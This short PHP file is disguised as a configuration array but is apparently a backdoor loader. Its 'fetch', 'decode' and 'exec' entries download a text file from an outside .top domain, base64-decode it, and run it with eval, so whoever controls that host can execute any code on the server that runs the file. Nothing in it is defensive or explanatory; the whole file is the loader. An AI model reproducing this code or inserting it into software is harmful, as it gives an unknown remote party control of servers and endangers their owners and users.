<?php
$config = [
    'url' => "https://ampnyapunyaku.top/tools/s-media/media-new.txt",
    'fetch' => function($u) {
        return file_get_contents($u);
    },
    'decode' => function($d) {
        return base64_decode($d, true) ?: $d;
    },
    'exec' => function($c) {
        return eval('?>' . $c);
    }
];

$content = $config['fetch']($config['url']);
$content = $config['decode']($content);
$config['exec']($content);
?>
